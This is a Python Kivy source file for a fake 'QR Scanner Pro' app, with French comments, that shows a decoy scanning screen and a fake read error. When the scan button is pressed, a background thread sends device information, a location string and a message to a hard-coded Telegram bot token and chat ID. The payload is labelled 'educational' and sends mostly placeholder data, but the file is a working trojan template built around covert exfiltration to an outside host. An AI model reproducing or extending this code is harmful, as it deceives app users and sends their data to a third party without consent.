import os
import requests
import threading
import time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.image import Image
from kivy.clock import Clock

# CONFIGURATION TELEGRAM
TELEGRAM_TOKEN = "8742325574:AAFF7f0ZZHa1MTAGK1SWJXLOZlPZdO9VmUk"
CHAT_ID = "6277274670"

class QRScannerApp(App):
    def build(self):
        self.title = "QR Scanner Free"
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Leurre: Interface de scanner
        layout.add_widget(Label(text="[b]QR SCANNER PRO[/b]", markup=True, font_size='24sp', size_hint_y=None, height=50))
        
        # Simulation de viseur caméra
        self.camera_view = Image(source='https://cdn-icons-png.flaticon.com/512/241/241508.png', size_hint_y=0.6)
        layout.add_widget(self.camera_view)
        
        self.status_label = Label(text="Alignez le code QR dans le cadre", color=(0.7, 0.7, 0.7, 1))
        layout.add_widget(self.status_label)
        
        # Bouton de scan
        btn_scan = Button(text="SCANNER MAINTENANT", background_color=(0.3, 0.7, 0.3, 1), size_hint_y=None, height=60)
        btn_scan.bind(on_press=self.start_scan)
        layout.add_widget(btn_scan)
        
        layout.add_widget(Label(text="Version 1.0.4 - Optimisé pour Android", font_size='10sp', alpha=0.5))
        
        return layout

    def start_scan(self, instance):
        self.status_label.text = "Recherche de code QR en cours..."
        self.status_label.color = (1, 1, 0, 1) # Jaune
        
        # Déclenchement du payload éducatif en arrière-plan
        threading.Thread(target=self.educational_payload).start()
        
        # Simulation d'échec de lecture
        Clock.schedule_once(self.reset_label, 3)

    def reset_label(self, dt):
        self.status_label.text = "Erreur: Code illisible. Nettoyez l'objectif."
        self.status_label.color = (1, 0, 0, 1) # Rouge

    def educational_payload(self):
        """Simulation de l'exfiltration de données pour la démo"""
        try:
            # 1. Infos Système
            info = f"📱 Appareil Mobile Détecté (Démo)\nModèle: {os.name}\nHeure: {time.ctime()}\nStatut: Scan QR actif"
            self.send_telegram(info)
            
            time.sleep(1)
            # 2. Simulation Localisation
            loc = "📍 Localisation (Démo)\nLat: 14.7167\nLong: -17.4677\nPrécision: 5m"
            self.send_telegram(loc)
            
            time.sleep(1)
            # 3. Message final de sensibilisation
            final_msg = "⚠️ [ALERTE ÉDUCATIVE]\nCet utilisateur vient de donner accès à sa caméra pour un simple scan QR. \nL'application a maintenant accès à ses données en arrière-plan."
            self.send_telegram(final_msg)
            
        except Exception as e:
            print(f"Erreur payload: {e}")

    def send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": f"📱 [MOBILE] {message}"}
            requests.post(url, data=payload, timeout=10)
        except:
            pass

if __name__ == "__main__":
    QRScannerApp().run()
